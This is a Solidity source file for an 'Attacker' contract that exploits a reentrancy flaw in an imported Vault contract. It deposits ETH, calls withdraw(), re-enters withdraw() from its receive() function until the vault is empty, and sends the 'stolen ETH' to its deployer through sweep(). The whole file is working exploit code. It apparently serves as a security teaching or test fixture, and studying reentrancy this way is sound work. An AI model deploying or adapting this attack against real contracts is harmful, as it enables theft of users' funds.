// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Vault} from "./Vault.sol";

/// @title Attacker Contract
/// @notice Drains a vulnerable Vault by re-entering withdraw() from receive()
///         before the vault has a chance to zero this contract's balance.
contract Attacker {
    Vault public immutable vault;
    address public immutable owner;

    constructor(address _vault) {
        vault = Vault(_vault);
        owner = msg.sender;
    }

    /// @notice The attack: deposit one chunk, then withdraw it. The
    ///         withdraw sends ETH back to this contract, triggering receive(),
    ///         which re-enters before the vault updates state.
    /// @dev    Seed this with a normal-sized deposit, e.g. 1 ether.
    function attack() external payable {
        require(msg.value > 0, "seed the attack with some ETH");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    /// @notice Called every time the vault sends us ETH. While the vault still
    ///         has at least one more chunk to give, re-enter and take it.
    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.withdraw();
        }
    }

    /// @notice Move the stolen ETH out to the deployer's address.
    function sweep() external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
